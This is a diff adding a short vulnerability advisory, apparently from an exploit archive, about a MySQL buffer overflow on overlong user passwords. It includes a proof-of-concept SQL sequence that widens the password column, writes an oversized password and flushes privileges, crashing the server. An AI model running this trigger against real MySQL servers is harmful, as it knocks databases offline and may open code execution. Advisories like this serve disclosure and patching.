@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/8590/info
+
+MySQL server has been reported prone to a buffer overflow vulnerability when handling user passwords of excessive size.
+
+The issue presents itself, due to a lack of sufficient bounds checking performed when processing MySQL user passwords. A password greater that 16 characters may overrun the bounds of a reserved buffer in memory and corrupt adjacent memory. An attacker with global administrative privileges on an affected MySQL server may potentially exploit this condition to have arbitrary supplied instructions executed in the context of the MySQL server.
+
+> USE mysql;
+> ALTER TABLE User CHANGE COLUMN Password Password LONGTEXT;
+> UPDATE User SET Password =
+'123456781234567812345678123456781234567812345678123456781234567812345678
+123456781234567812345678123456781234567812345678123456781234567812345678
+123456781234567812345678123456781234567812345678123456781234567812345678
+12345678123456781234567812345678...' WHERE User = 'abcd';
+> FLUSH PRIVILEGES;
+
+[Connection lost]
+
+mysqld_safe/safe_mysqld log :
